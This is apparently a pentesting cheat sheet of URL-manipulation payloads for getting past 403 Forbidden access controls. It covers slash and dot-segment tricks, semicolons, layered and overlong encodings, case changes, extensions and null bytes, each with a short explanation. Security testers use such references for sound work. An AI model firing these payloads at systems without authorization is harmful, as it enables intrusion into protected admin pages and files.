# 403 Bypass

Below is an extensive and updated reference for 403 (Forbidden) bypass techniques and tricks for bug bounty hunters and penetration testers. 

## Url Manipulation Methods

# Seclists jhaddix list 

Below are the top 77 ways to bypass access control on incorrectely protected pages. These work best on config files and global dashboards. 

```
url.com/admin/?
url.com//admin//
url.com///admin///
url.com/./admin/./
url.com/admin?
url.com/admin??
url.com/admin??
url.com/admin/?/
url.com/admin/??
url.com/admin/??/
url.com/admin/..
url.com/admin/../
url.com/admin/./
url.com/admin/.
url.com/admin/.//
url.com/admin/*
url.com/admin//*
url.com/admin/%2f
url.com/admin/%2f/
url.com/admin/%20
url.com/admin/%20/
url.com/admin/%09
url.com/admin/%09/
url.com/admin/%0a
url.com/admin/%0a/
url.com/admin/%0d
url.com/admin/%0d/
url.com/admin/%25
url.com/admin/%25/
url.com/admin/%23
url.com/admin/%23/
url.com/admin/%26
url.com/admin/%3f
url.com/admin/%3f/
url.com/admin/%26/
url.com/admin/#
url.com/admin/#/
url.com/admin/#/./
url.com/./admin
url.com/./admin/
url.com/..;/admin
url.com/..;/admin/
url.com/.;/admin
url.com/.;/admin/
url.com/;/admin
url.com/;/admin/
url.com//;//admin
url.com//;//admin/
url.com/admin/./
url.com/%2e/admin
url.com/%2e/admin/
url.com/%20/admin/%20
url.com/%20/admin/%20/
url.com/admin/..;/
url.com/admin.json
url.com/admin/.json
url.com/admin..;/
url.com/admin;/
url.com/admin%00
url.com/admin.css
url.com/admin.html
url.com/admin?id=1
url.com/admin~
url.com/admin/~
url.com/admin/°/
url.com/admin/&
url.com/admin/-
url.com/admin\/\/
url.com/admin/..%3B/
url.com/admin/;%2f..%2f..%2f
url.com/ADMIN
url.com/ADMIN/
url.com/admin/..\;/
url.com/*/admin
url.com/*/admin/
url.com/ADM+IN
url.com/ADM+IN/
```




# Tooling

(update with wikinotes...)

 As far as automated tooling goes, https://github.com/devploit/nomore403 has the most coverage in terms of the above, plus other methods (Headers ++)




# Explanations

## Introduction to 403 Bypasses

A 403 Forbidden response indicates that the server understands the request but refuses to authorize it—often due to access control rules. However, misconfigurations, flawed logic, or unexpected parsing in web servers or applications can sometimes be exploited to bypass these restrictions. This first page covers the most common and foundational URL manipulation approaches. These should be your starting point when you encounter a 403 response.

# 1. Baseline & Redundant Slash Tricks
Servers often normalize multiple slashes (// or ///) into a single slash, but poorly implemented access control checks may only inspect a canonical path.

```
url.com//admin//
url.com///admin///
url.com/admin\/\/
url.com/admin\\..
url.com//;//admin
url.com//;//admin/
```

## Why it Works

Different frameworks (Nginx, Apache, IIS, etc.) handle consecutive slashes or backslashes differently, sometimes ignoring them, sometimes interpreting them in unexpected ways.





# 2. Dot Slash & Dot Dot Slash
Dot segments like ./ (current directory) or ../ (parent directory) may confuse path normalization if the application’s access control does not sanitize them properly.

```
url.com/./admin/./
url.com/admin/./
url.com/admin/..
url.com/admin/../
url.com/admin/..;/
url.com/admin/..%3B/
url.com/./admin
url.com/admin/.//
```

## Why it Works

The server might treat . and .. in ways the WAF or access control logic does not expect (especially when combined with encoding or extra symbols).




# 3. Query String & Parameter Manipulations
Appending question marks, extra parameters, or weird query strings can sometimes bypass naive path-based checks.
```
url.com/admin/?
url.com/admin??
url.com/admin/??/
url.com/admin?id=1
url.com/admin?id=1&dummy=2
url.com/admin?&   (empty parameter)
```

## Why it Works
Some frameworks only check the path portion before “?”, ignoring or incorrectly handling query parameters.





## 4. Special Character Injection
Use special characters or uncommon path separators (;, #, *, ~, etc.):

```
url.com/admin/# 
url.com/admin/#/
url.com/admin/* 
url.com/admin~ 
url.com/admin/°/
url.com/admin/-
url.com/admin/&
url.com/admin(…)
url.com/admin!… 
url.com/admin@… 
url.com/admin#
url.com/..;/admin
url.com/.;/admin
url.com/.;/admin/
```
## Why it Works

Certain characters may break or bypass path validation routines. Semicolons (;) especially are an old trick in Tomcat/Apache contexts.






## 5. Encoding & Mixed Encoding
Properly or improperly encoded paths can dodge filters that only match unencoded strings. Combine multiple layers of encoding or partial encodings:

## Common Encodings

```
url.com/admin/%20
url.com/admin/%2f
url.com/admin/%09
url.com/admin/%0a
url.com/admin/%0d
url.com/admin/%25
url.com/admin/%3f
url.com/admin/%26
url.com/admin/%00
```

## Double/Triple Encodings

``
url.com/admin/%252f   (Decodes to %2f -> '/')
url.com/admin%25253F  (Double-encoded '?')
``

##Unicode/Overlong UTF-8
```
url.com/%u0061dmin    (Unicode for 'admin')
url.com/%c0%afadmin   (Overlong UTF-8 for '/')
url.com/admin%e5%98%8a%e5%98%8d  (Obscure Unicode)
```

## Why it Works

WAFs and access controls often have a single decode step. If you double- or triple-encode, you may bypass that first filter.



# 6. Case Variations & Typos
On Windows-based servers or other case-insensitive file systems, changing the case might help. Some apps do strict checks expecting admin in lowercase:

```
url.com/ADMIN
url.com/ADMIN/
url.com/ADM+IN
url.com/AdMiN
```
## Why it Works

The server (or an app route) might treat paths case-insensitively, while a WAF or rewrite rule is case-sensitive.


# 7. File Extension & Null Byte Tricks
Appending or removing file extensions might bypass extension-based filters.

```
url.com/admin.json
url.com/admin.css
url.com/admin.html
url.com/admin.php~
url.com/admin.old
url.com/admin.bak
url.com/admin.inc
url.com/admin.~
url.com/admin%00
```
## Why it Works

Some servers only block .php or .asp but forget to block .json or .bak. A null byte (%00) can truncate path checks on older or poorly written code.


(to-add: headers + methods)
